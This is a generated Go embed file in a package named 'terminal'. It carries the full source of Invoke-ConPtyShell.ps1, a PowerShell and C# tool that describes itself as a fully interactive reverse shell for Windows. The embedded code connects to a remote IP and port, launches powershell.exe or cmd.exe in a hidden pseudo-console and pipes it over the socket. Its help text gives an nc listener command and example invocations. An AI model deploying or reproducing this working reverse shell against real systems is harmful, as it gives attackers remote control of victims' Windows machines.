// Code generated by rice embed-go; DO NOT EDIT.
package terminal

import (
	"time"

	"github.com/GeertJohan/go.rice/embedded"
)

func init() {

	// define files
	file2 := &embedded.EmbeddedFile{
		Filename:    "Invoke-ConPtyShell.ps1",
		FileModTime: time.Unix(1614329807, 0),

		Content: string("#Requires -Version 2\n\nfunction Invoke-ConPtyShell\n{   \n    <#\n        .SYNOPSIS\n            ConPtyShell - Fully Interactive Reverse Shell for Windows \n            Author: splinter_code\n            License: MIT\n            Source: https://github.com/antonioCoco/ConPtyShell\n        \n        .DESCRIPTION\n            ConPtyShell - Fully interactive reverse shell for Windows\n            \n            Properly set the rows and cols values. You can retrieve it from\n            your terminal with the command \"stty size\".\n            \n            You can avoid to set rows and cols values if you run your listener\n            with the following command:\n                stty raw -echo; (stty size; cat) | nc -lvnp 3001\n           \n            If you want to change the console size directly from powershell\n            you can paste the following commands:\n                $width=80\n                $height=24\n                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)\n                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)\n            \n            \n        .PARAMETER RemoteIp\n            The remote ip to connect\n        .PARAMETER RemotePort\n            The remote port to connect\n        .PARAMETER Rows\n            Rows size for the console\n            Default: \"24\"\n        .PARAMETER Cols\n            Cols size for the console\n            Default: \"80\"\n        .PARAMETER CommandLine\n            The commandline of the process that you are going to interact\n            Default: \"powershell.exe\"\n            \n        .EXAMPLE  \n            PS>Invoke-ConPtyShell 10.0.0.2 3001\n            \n            Description\n            -----------\n            Spawn a reverse shell\n\n        .EXAMPLE\n            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90\n            \n            Description\n            -----------\n            Spawn a reverse shell with specific rows and cols size\n            \n         .EXAMPLE\n            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe\n            \n            Description\n            -----------\n            Spawn a reverse shell (cmd.exe) with specific rows and cols size\n            \n    #>\n    Param\n    (\n        [Parameter(Position = 0, Mandatory = $True)]\n        [String]\n        $RemoteIp,\n        \n        [Parameter(Position = 1, Mandatory = $True)]\n        [String]\n        $RemotePort,\n\n        [Parameter()]\n        [String]\n        $Rows = \"24\",\n\n        [Parameter()]\n        [String]\n        $Cols = \"80\",\n\n        [Parameter()]\n        [String]\n        $CommandLine = \"powershell.exe\"\n    )\n    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)\n    Add-Type -TypeDefinition $Source -Language CSharp;\n    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)\n    Write-Output $output\n}\n\n$Source = @\"\nusing System;\nusing System.IO;\nusing System.Text;\nusing System.Threading;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Runtime.InteropServices;\n\npublic static class ConPtyShell\n{\n    private const string errorString = \"{{{ConPtyShellException}}}\\r\\n\";\n    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;\n    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;\n    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;\n    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;\n    private const uint CREATE_NO_WINDOW = 0x08000000;\n    private const int STARTF_USESTDHANDLES = 0x00000100;\n    private const int BUFFER_SIZE_PIPE = 1048576;\n\n    private const UInt32 INFINITE = 0xFFFFFFFF;\n    private const int SW_HIDE = 0;\n    private const uint GENERIC_READ = 0x80000000;\n    private const uint GENERIC_WRITE = 0x40000000;\n    private const uint FILE_SHARE_READ = 0x00000001;\n    private const uint FILE_SHARE_WRITE = 0x00000002;\n    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;\n    private const uint OPEN_EXISTING = 3;\n    private const int STD_INPUT_HANDLE = -10;\n    private const int STD_OUTPUT_HANDLE = -11;\n    private const int STD_ERROR_HANDLE = -12;\n    \n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    private struct STARTUPINFOEX\n    {\n        public STARTUPINFO StartupInfo;\n        public IntPtr lpAttributeList;\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    private struct STARTUPINFO\n    {\n        public Int32 cb;\n        public string lpReserved;\n        public string lpDesktop;\n        public string lpTitle;\n        public Int32 dwX;\n        public Int32 dwY;\n        public Int32 dwXSize;\n        public Int32 dwYSize;\n        public Int32 dwXCountChars;\n        public Int32 dwYCountChars;\n        public Int32 dwFillAttribute;\n        public Int32 dwFlags;\n        public Int16 wShowWindow;\n        public Int16 cbReserved2;\n        public IntPtr lpReserved2;\n        public IntPtr hStdInput;\n        public IntPtr hStdOutput;\n        public IntPtr hStdError;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    private struct PROCESS_INFORMATION\n    {\n        public IntPtr hProcess;\n        public IntPtr hThread;\n        public int dwProcessId;\n        public int dwThreadId;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    private struct SECURITY_ATTRIBUTES\n    {\n        public int nLength;\n        public IntPtr lpSecurityDescriptor;\n        public int bInheritHandle;\n    }\n    \n    [StructLayout(LayoutKind.Sequential)]\n    private struct COORD\n    {\n        public short X;\n        public short Y;\n    }\n    \n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n\n    [DllImport(\"kernel32.dll\", SetLastError=true, CharSet=CharSet.Auto)]\n    private static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n\n    [DllImport(\"kernel32.dll\", SetLastError=true)]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);\n    \n    [DllImport(\"kernel32.dll\", SetLastError=true)]\n    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n            \n    [DllImport(\"kernel32.dll\", SetLastError=true)]\n    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);\n    \n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern IntPtr GetStdHandle(int nStdHandle);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern bool CloseHandle(IntPtr hObject);\n    \n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);\n\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]\n    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);\n \n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);\n   \n    [DllImport(\"kernel32.dll\", SetLastError=true)]\n    private static extern bool WriteFile(IntPtr hFile, byte [] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);\n    \n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern int ClosePseudoConsole(IntPtr hPC);\n    \n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);\n    \n    [DllImport(\"kernel32.dll\")]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    private static extern bool AllocConsole();\n    \n    [DllImport(\"kernel32.dll\", SetLastError=true, ExactSpelling=true)]\n    private static extern bool FreeConsole();\n    \n    [DllImport(\"user32.dll\")]\n    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n\n    [DllImport(\"kernel32.dll\")]\n    private static extern IntPtr GetConsoleWindow();\n    \n    [DllImport(\"kernel32.dll\", CharSet=CharSet.Auto)]\n    private static extern IntPtr GetModuleHandle(string lpModuleName);\n    \n    [DllImport(\"kernel32\", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]\n    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    \n    private static Socket ConnectSocket(string remoteIp, int remotePort){\n        Socket s = null;\n        IPAddress remoteIpInt = IPAddress.Parse(remoteIp);\n        IPEndPoint ipEndpoint = new IPEndPoint(remoteIpInt, remotePort);\n        Socket shellSocket = new Socket(ipEndpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);\n        try{\n            shellSocket.Connect(ipEndpoint);\n            if(shellSocket.Connected)\n            s = shellSocket;\n            byte[] banner = Encoding.ASCII.GetBytes(\"\\r\\nConPtyShell - @splinter_code\\r\\n\");\n            s.Send(banner);\n        }\n        catch{\n            s = null;\n        }\n        return s;\n    }\n    \n    private static void TryParseRowsColsFromSocket(Socket shellSocket, ref uint rows, ref uint cols){\n        Thread.Sleep(500);//little tweak for slower connections\n        if (shellSocket.Available > 0){\n            byte[] received = new byte[100];\n            int rowsTemp, colsTemp;\n            int bytesReceived = shellSocket.Receive(received);\n            string sizeReceived = Encoding.ASCII.GetString(received,0,bytesReceived); \n            string rowsString = sizeReceived.Split(' ')[0].Trim();\n            string colsString = sizeReceived.Split(' ')[1].Trim();\n            if(Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp)){\n                rows=(uint)rowsTemp;\n                cols=(uint)colsTemp;\n            }\n        }\n    }\n    \n    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite){\n        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();\n        pSec.nLength = Marshal.SizeOf(pSec);\n        pSec.bInheritHandle=1;\n        pSec.lpSecurityDescriptor=IntPtr.Zero;\n        if(!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))\n            throw new InvalidOperationException(\"Could not create the InputPipe\");\n        if(!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))\n            throw new InvalidOperationException(\"Could not create the OutputPipe\");\n    }\n    \n    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr){\n        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);\n        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);\n        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);\n        IntPtr hStdout = CreateFile(\"CONOUT$\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);\n        IntPtr hStdin = CreateFile(\"CONIN$\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);\n        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);\n        SetStdHandle(STD_ERROR_HANDLE, hStdout);\n        SetStdHandle(STD_INPUT_HANDLE, hStdin); \n    }\n    \n    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr){\n        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);\n        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);\n        SetStdHandle(STD_INPUT_HANDLE, oldStdIn); \n    }\n    \n    private static void EnableVirtualTerminalSequenceProcessing()\n    {\n        uint outConsoleMode = 0;\n        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);\n        if (!GetConsoleMode(hStdOut, out outConsoleMode))\n        {\n            throw new InvalidOperationException(\"Could not get console mode\");\n        }\n        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;\n        if (!SetConsoleMode(hStdOut, outConsoleMode))\n        {\n            throw new InvalidOperationException(\"Could not enable virtual terminal processing\");\n        }\n    }\n    \n    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols){\n        int result = -1;\n        EnableVirtualTerminalSequenceProcessing();\n        COORD consoleCoord = new COORD();\n        consoleCoord.X=(short)cols;\n        consoleCoord.Y=(short)rows;\n        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);\n        return result;\n    }\n    \n    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)\n    {\n        IntPtr lpSize = IntPtr.Zero;\n        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);\n        if (success || lpSize == IntPtr.Zero)\n        {\n            throw new InvalidOperationException(\"Could not calculate the number of bytes for the attribute list. \" + Marshal.GetLastWin32Error());\n        }\n        STARTUPINFOEX startupInfo = new STARTUPINFOEX();\n        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);\n        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);\n        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);\n        if (!success)\n        {\n            throw new InvalidOperationException(\"Could not set up attribute list. \" + Marshal.GetLastWin32Error());\n        }\n        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero,IntPtr.Zero);\n        if (!success)\n        {\n            throw new InvalidOperationException(\"Could not set pseudoconsole thread attribute. \" + Marshal.GetLastWin32Error());\n        }\n        return startupInfo;\n    }\n    \n    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)\n    {\n        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();\n        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();\n        int securityAttributeSize = Marshal.SizeOf(pSec);\n        pSec.nLength = securityAttributeSize;\n        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();\n        tSec.nLength = securityAttributeSize;\n        bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);\n        if (!success)\n        {\n            throw new InvalidOperationException(\"Could not create process. \" + Marshal.GetLastWin32Error());\n        }\n        return pInfo;\n    }\n    \n    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine){\n        STARTUPINFOEX startupInfo =  ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);\n        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);\n        return processInfo;\n    }\n        \n    private static void ThreadReadPipeWriteSocket(object threadParams)\n    {\n        object[] threadParameters = (object[]) threadParams;\n        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];\n        Socket shellSocket = (Socket)threadParameters[1];\n        uint bufferSize=16*1024;\n        byte[] bytesToWrite = new byte[bufferSize];\n        bool readSuccess = false;\n        Int32 bytesSent = 0;\n        uint dwBytesRead=0;\n        do{\n            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, bufferSize, out dwBytesRead, IntPtr.Zero);\n            bytesSent = shellSocket.Send(bytesToWrite, (Int32)dwBytesRead, 0);\n        } while (bytesSent > 0 && readSuccess);\n    }\n    \n    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, Socket shellSocket){\n        object[] threadParameters = new object[2];\n        threadParameters[0]=OutputPipeRead;\n        threadParameters[1]=shellSocket;\n        Thread thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocket);\n        thThreadReadPipeWriteSocket.Start(threadParameters);\n        return thThreadReadPipeWriteSocket;\n    }\n    \n    private static void ThreadReadSocketWritePipe(object threadParams)\n    {\n        object[] threadParameters = (object[]) threadParams;\n        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];\n        Socket shellSocket = (Socket)threadParameters[1];\n        IntPtr hChildProcess = (IntPtr)threadParameters[2];\n        uint bufferSize=16*1024;\n        byte[] bytesReceived = new byte[bufferSize];\n        bool writeSuccess = false;\n        Int32 nBytesReceived = 0;\n        uint bytesWritten = 0;\n        do{\n            nBytesReceived = shellSocket.Receive(bytesReceived, (Int32)bufferSize, 0);\n            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);\t\n        } while (nBytesReceived > 0 && writeSuccess);\n        TerminateProcess(hChildProcess, 0);\n    }\n    \n    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, Socket shellSocket, IntPtr hChildProcess){\n        object[] threadParameters = new object[3];\n        threadParameters[0]=InputPipeWrite;\n        threadParameters[1]=shellSocket;\n        threadParameters[2]=hChildProcess;\n        Thread thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipe);\n        thReadSocketWritePipe.Start(threadParameters);\n        return thReadSocketWritePipe;\n    }\n    \n    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine){\n        string output = \"\";\n        Socket shellSocket = ConnectSocket(remoteIp, remotePort);\n        if(shellSocket == null){            \n            output += string.Format(\"{0}Could not connect to ip {1} on port {2}\", errorString, remoteIp, remotePort.ToString());\n            return output;\n        }\n        TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);\n        IntPtr InputPipeRead = new IntPtr(0);\n        IntPtr InputPipeWrite = new IntPtr(0);\n        IntPtr OutputPipeRead = new IntPtr(0);\n        IntPtr OutputPipeWrite = new IntPtr(0);\n        IntPtr handlePseudoConsole = new IntPtr(0);\n        IntPtr oldStdIn = new IntPtr(0);\n        IntPtr oldStdOut = new IntPtr(0);\n        IntPtr oldStdErr = new IntPtr(0);\n        bool newConsoleAllocated = false;\n        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();\n        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);\n        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);\n        if(GetProcAddress(GetModuleHandle(\"kernel32\"), \"CreatePseudoConsole\") == IntPtr.Zero){\n            Console.WriteLine(\"\\r\\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\\r\\n\");\n            STARTUPINFO sInfo = new STARTUPINFO();\n            sInfo.cb = Marshal.SizeOf(sInfo);\n            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES; \n            sInfo.hStdInput = InputPipeRead;       \n            sInfo.hStdOutput = OutputPipeWrite;\n            sInfo.hStdError = OutputPipeWrite;\n            CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);\n        }\n        else{\n            Console.WriteLine(\"\\r\\nCreatePseudoConsole function found! Spawning a fully interactive shell...\\r\\n\");\n            if(GetConsoleWindow() == IntPtr.Zero){\n                AllocConsole();\n                ShowWindow(GetConsoleWindow(), SW_HIDE);\n                newConsoleAllocated = true;\n            }\n            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);\n            if(pseudoConsoleCreationResult != 0)\n            {\n                output += string.Format(\"{0}Could not create psuedo console. Error Code {1}\", errorString, pseudoConsoleCreationResult.ToString());\n                return output;\n            }\n            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);\n        }\n        // Note: We can close the handles to the PTY-end of the pipes here\n        // because the handles are dup'ed into the ConHost and will be released\n        // when the ConPTY is destroyed.\n        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);\n        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);\n        //Threads have better performance than Tasks\n        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket);\n        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess);\n        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);\n        //cleanup everything\n        thThreadReadPipeWriteSocket.Abort();\n        thReadSocketWritePipe.Abort();\n        shellSocket.Shutdown(SocketShutdown.Both);\n        shellSocket.Close();\n        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);\n        if(newConsoleAllocated)\n            FreeConsole();\n        CloseHandle(childProcessInfo.hThread);\n        CloseHandle(childProcessInfo.hProcess);\n        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);\n        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);\n        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);\n        output += \"ConPtyShell kindly exited.\\r\\n\";\n        return output;\n    }\n}\n\npublic static class ConPtyShellMainClass{\n    private static string help = @\"\n\";\n    \n    private static bool HelpRequired(string param)\n    {\n        return param == \"-h\" || param == \"--help\" || param == \"/?\";\n    }\n    \n    private static void CheckArgs(string[] arguments)\n    {\n        if(arguments.Length < 2){\n            Console.Out.Write(\"\\r\\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\\r\\n\");\n            System.Environment.Exit(0);\n        }\n            \n    }\n    \n    private static void DisplayHelp()\n    {\n        Console.Out.Write(help);\n    }\n    \n    private static string CheckRemoteIpArg(string ipString){\n        IPAddress address;\n        if (!IPAddress.TryParse(ipString, out address))\n        {\n            Console.Out.Write(\"\\r\\nConPtyShell: Invalid remoteIp value {0}\\r\\n\", ipString);\n            System.Environment.Exit(0);\n        }\n        return ipString;\n    }\n    \n    private static int CheckInt(string arg){\n        int ret = 0;\n        if (!Int32.TryParse(arg, out ret))\n        {\n            Console.Out.Write(\"\\r\\nConPtyShell: Invalid integer value {0}\\r\\n\", arg);\n            System.Environment.Exit(0);\n        }\n        return ret;\n    }\n    \n    private static uint ParseRows(string[] arguments){\n        uint rows = 24;\n        if (arguments.Length > 2)\n            rows = (uint)CheckInt(arguments[2]);\n        return rows;\n    }\n    \n    private static uint ParseCols(string[] arguments){\n        uint cols = 80;\n        if (arguments.Length > 3)\n            cols = (uint)CheckInt(arguments[3]);\n        return cols;\n    }\n\n    private static string ParseCommandLine(string[] arguments){\n        string commandLine = \"powershell.exe\";\n        if (arguments.Length > 4)\n            commandLine = arguments[4];\n        return commandLine;\n    }\n\n    public static string ConPtyShellMain(string[] args){\n        string output=\"\";\n        if (args.Length == 1 && HelpRequired(args[0]))\n        {\n            DisplayHelp();\n        }\n        else\n        {\n            CheckArgs(args);\n            string remoteIp = CheckRemoteIpArg(args[0]);\n            int remotePort = CheckInt(args[1]);\n            uint rows = ParseRows(args);\n            uint cols = ParseCols(args);\n            string commandLine = ParseCommandLine(args);\n            output=ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine);\n        }\n        return output;\n    }\n}\n\n\nclass MainClass{\n    static void Main(string[] args)\n    {\n        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));\n    }\n}\n\"@;"),
	}

	// define dirs
	dir1 := &embedded.EmbeddedDir{
		Filename:   "",
		DirModTime: time.Unix(1614346219, 0),
		ChildFiles: []*embedded.EmbeddedFile{
			file2, // "Invoke-ConPtyShell.ps1"

		},
	}

	// link ChildDirs
	dir1.ChildDirs = []*embedded.EmbeddedDir{}

	// register embeddedBox
	embedded.RegisterEmbeddedBox(`../static/`, &embedded.EmbeddedBox{
		Name: `../static/`,
		Time: time.Unix(1614346219, 0),
		Dirs: map[string]*embedded.EmbeddedDir{
			"": dir1,
		},
		Files: map[string]*embedded.EmbeddedFile{
			"Invoke-ConPtyShell.ps1": file2,
		},
	})
}
